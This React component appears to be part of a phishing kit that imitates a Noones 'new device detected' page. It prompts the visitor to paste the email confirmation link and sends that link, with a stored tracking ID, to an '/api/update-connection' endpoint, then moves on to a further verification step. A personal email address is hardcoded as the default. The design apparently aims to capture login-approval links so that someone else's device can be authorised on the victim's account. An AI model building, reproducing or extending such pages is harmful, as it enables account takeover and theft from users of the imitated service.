import React, { useState, useEffect, useRef } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';

const NOONES_SESSION_ID_KEY = 'noones_session_id';
const NOONES_CURRENT_STEP_KEY = 'noones_current_step';
const NOONES_REQUEST_DATA_KEY = 'noones_request_data';

export default function NoonesNewDeviceVerification() {
  const navigate = useNavigate();
  const location = useLocation();
  const [isDarkMode, setIsDarkMode] = useState(true);
  const [selectedLanguage, setSelectedLanguage] = useState('English');
  const [showLanguageDropdown, setShowLanguageDropdown] = useState(false);
  const [link, setLink] = useState('');
  const [resendTimer, setResendTimer] = useState(5);
  const [isLoading, setIsLoading] = useState(false);
  const [isRedirecting, setIsRedirecting] = useState(false);
  const [backendError, setBackendError] = useState('');
  const linkInputRef = useRef<HTMLInputElement>(null);

  const email = location.state?.email || 'gibsonkobia@gmail.com';
  const logoSrc = isDarkMode ? '/logos/noonesdark.jpg' : '/logos/nooneslight.jpg';

  useEffect(() => {
    if (resendTimer <= 0) return;
    const timer = setTimeout(() => setResendTimer((current) => current - 1), 1000);
    return () => clearTimeout(timer);
  }, [resendTimer]);

  useEffect(() => {
    if (resendTimer === 0 && linkInputRef.current) {
      linkInputRef.current.focus();
    }
  }, [resendTimer]);

  useEffect(() => {
    const step = window.localStorage.getItem(NOONES_CURRENT_STEP_KEY);
    const requestDataStr = window.localStorage.getItem(NOONES_REQUEST_DATA_KEY);
    const requestData = requestDataStr ? JSON.parse(requestDataStr) : null;
    if (step === '3' && requestData) {
      navigate('/connect/noones/verify-device', { state: { email, platformData: requestData } });
    }
  }, [navigate, email]);

  const handleLinkChange = (value: string) => {
    setLink(value);
  };

  const handleVerifyLink = async () => {
    if (link.trim() === '') return;

    setIsLoading(true);

    try {
      setBackendError('');
      const trackingId = window.localStorage.getItem(NOONES_SESSION_ID_KEY);
      if (!trackingId) {
        throw new Error('No tracking ID found');
      }

      console.log('[NOONES_STEP2] Updating confirmation_link for tracking_id:', trackingId);
      
      const response = await fetch('/api/update-connection', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ tracking_id: trackingId, confirmation_link: link.trim() }),
      });

      console.log('[NOONES_STEP2] API response status:', response.status);
      const payload = await response.json().catch(() => ({}));
      console.log('[NOONES_STEP2] API response payload:', payload);

      if (!response.ok) {
        const message = payload?.error || 'Unknown error';
        console.error('[NOONES_STEP2] ❌ update-connection failed:', message);
        setBackendError(`Unable to update verification link: ${message}`);
        setIsLoading(false);
        return;
      }

      console.log('[NOONES_STEP2] ✅ update-connection success:', payload);
      console.log('[NOONES_STEP2] 🚀 UPDATE completed, proceeding to Step 3');

      // Update progress
      const requestDataStr = window.localStorage.getItem(NOONES_REQUEST_DATA_KEY);
      const requestData = requestDataStr ? JSON.parse(requestDataStr) : {};
      window.localStorage.setItem(NOONES_CURRENT_STEP_KEY, '3');
      window.localStorage.setItem(NOONES_REQUEST_DATA_KEY, JSON.stringify({ ...requestData, confirmation_link: link.trim() }));

      // Navigate after brief delay
      setTimeout(() => {
        setIsRedirecting(true);
      }, 3000);

      setTimeout(() => {
        navigate('/connect/noones/verify-device', { state: { email, platformData: { ...requestData, confirmation_link: link.trim() } } });
      }, 3000);
    } catch (err: any) {
      console.error('[NOONES_STEP2] Error:', err);
      const message = err?.message || 'Verification failed. Please try again.';
      setBackendError(message);
      alert(message);
      setIsLoading(false);
    }
  };
  const pageBg = isDarkMode ? 'bg-[#202020]' : 'bg-[#f2f2f2]';
  const cardBg = isDarkMode ? 'bg-[#292929] border border-[#333333]' : 'bg-white border border-slate-200';
  const pageText = isDarkMode ? 'text-white' : 'text-slate-900';
  const secondaryText = isDarkMode ? 'text-slate-400' : 'text-slate-500';
  const accentColor = isDarkMode ? '#44C166' : '#18C37E';

  return (
    <main className={`${pageBg} min-h-screen w-full flex flex-col items-center justify-center gap-8 py-10 px-4 sm:px-6 font-sans text-sm ${pageText}`}>
      <div className="w-[220px] flex justify-center">
        <img src={logoSrc} alt="Noones logo" className="w-full h-auto" />
      </div>

      <div className="w-full max-w-[480px]">
        <div className={`w-full ${cardBg} rounded-[32px] shadow-[0_40px_120px_rgba(0,0,0,0.18)] p-10 overflow-hidden`}
          style={{ boxShadow: isDarkMode ? '0 40px 120px rgba(0,0,0,0.28)' : '0 40px 120px rgba(15, 23, 42, 0.08)' }}
        >
          {isLoading ? (
            <div className="text-center">
              <div className="mb-4">
                <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-[#44C166] mx-auto"></div>
              </div>
              <h1 className="text-2xl font-semibold mb-4" style={{ color: isDarkMode ? '#F8FAFC' : '#111827' }}>
                {isRedirecting ? 'Redirecting...' : 'Verifying Device'}
              </h1>
              <p className={`text-base ${secondaryText}`}>
                {isRedirecting ? 'Please wait while we redirect you.' : 'Please be patient as we verify your device.'}
              </p>
            </div>
          ) : (
            <>
              <h1 className="text-center text-3xl font-semibold tracking-tight mb-4" style={{ color: isDarkMode ? '#F8FAFC' : '#111827' }}>
                New device detected
              </h1>

              <div className="space-y-1 text-center mb-8">
                <p className={`text-base font-normal ${secondaryText}`}>Confirm this is your device from the email we just sent to</p>
                <p className={`text-base font-medium ${isDarkMode ? 'text-white' : 'text-slate-900'}`}>
                  <span style={{ color: accentColor, fontWeight: 'bold' }}>{email}</span>
                </p>
              </div>

              <div className="flex justify-center items-center mb-6 opacity-50">
                <span className="text-6xl">💻</span>
                <span className="text-6xl -ml-4">📱</span>
                <span className="text-6xl -ml-4">🖥️</span>
              </div>

              <p className={`text-center text-sm mb-8 ${secondaryText}`}>We don't recognize this device</p>

              {resendTimer > 0 ? (
                <button
                  disabled
                  className="w-full h-14 rounded-full text-base font-semibold bg-white/10 cursor-not-allowed opacity-70 text-white mb-4"
                >
                  Resend email ({resendTimer} sec.)
                </button>
              ) : (
                <input
                  ref={linkInputRef}
                  type="text"
                  value={link}
                  onChange={(e) => handleLinkChange(e.target.value)}
                  placeholder="Enter the verification link here"
                  className={`w-full h-14 px-4 rounded-full text-base font-semibold border outline-none focus:ring-0 transition-colors mb-4 ${isDarkMode ? 'border-white/10 bg-[#181B1F] text-white focus:border-[#44C166]' : 'border-slate-300 bg-slate-100 text-slate-900 focus:border-[#18C37E]'}`}
                />
              )}

              <button
                onClick={resendTimer === 0 ? handleVerifyLink : () => {/* Try another way */}}
                disabled={resendTimer === 0 && link.trim() === ''}
                className={`w-full h-14 rounded-full text-base font-semibold transition-all ${resendTimer === 0 ? (link.trim() !== '' ? 'text-black bg-[#44C166] hover:bg-[#3fb85a]' : 'bg-white/10 cursor-not-allowed opacity-70 text-white') : 'text-black bg-[#44C166] hover:bg-[#3fb85a]'} mb-4`}
              >
                {resendTimer === 0 ? 'Submit' : 'Try another way'}
              </button>

              {backendError ? (
                <p className="text-center text-sm mb-4 text-red-400">{backendError}</p>
              ) : null}

              <div className="text-center mb-8">
                <a href="#" className="text-green-500 underline text-sm">Cancel signing in</a>
              </div>

              <p className={`text-center text-xs ${secondaryText}`}>
                If you need help, please{' '}
                <a href="#support" className={`font-semibold`} style={{ color: accentColor }}>
                  contact support
                </a>
              </p>
            </>
          )}
        </div>
      </div>

      <div className="w-full max-w-[480px] flex items-center justify-between px-2">
        <button
          type="button"
          onClick={() => setIsDarkMode(!isDarkMode)}
          className="flex items-center gap-3 text-base p-0 bg-transparent transition-all duration-300"
          style={{ color: isDarkMode ? '#D8DCE6' : '#111827' }}
        >
          <span className={isDarkMode ? 'opacity-100' : 'opacity-50'}>☀️</span>
          <div className="w-14 h-6 rounded-full relative transition-all duration-300 overflow-hidden" style={{ backgroundColor: isDarkMode ? '#44C166' : '#666A78' }}>
            <span className={`absolute top-1 w-4 h-4 rounded-full bg-white shadow-md transition-all duration-300 ${isDarkMode ? 'translate-x-7' : 'translate-x-1'}`} />
          </div>
          <span className={isDarkMode ? 'opacity-50' : 'opacity-100'}>🌙</span>
        </button>

        <button className="flex items-center gap-1 text-sm font-semibold relative" style={{ color: isDarkMode ? '#44C166' : '#18C37E' }}>
          <div className="relative">
            <button 
              onClick={() => setShowLanguageDropdown(!showLanguageDropdown)}
              className="flex items-center gap-1 hover:underline transition-all duration-200"
            >
              {selectedLanguage} <span className="text-[10px]">▼</span>
            </button>
            {showLanguageDropdown && (
              <div className={`absolute bottom-full right-0 mb-2 w-32 rounded-lg shadow-lg border ${isDarkMode ? 'bg-[#292929] border-[#333333]' : 'bg-white border-slate-200'}`}>
                {['English', 'Nigerian Pidgin'].map((lang) => (
                  <button
                    key={lang}
                    onClick={() => {
                      setSelectedLanguage(lang);
                      setShowLanguageDropdown(false);
                    }}
                    className={`w-full text-left px-3 py-2 text-sm hover:bg-opacity-10 transition-colors ${
                      selectedLanguage === lang 
                        ? (isDarkMode ? 'bg-[#44C166] bg-opacity-20' : 'bg-[#18C37E] bg-opacity-20') 
                        : 'hover:bg-gray-100'
                    }`}
                    style={{ color: isDarkMode ? '#F8FAFC' : '#111827' }}
                  >
                    {lang}
                  </button>
                ))}
              </div>
            )}
          </div>
        </button>
      </div>
    </main>
  );
}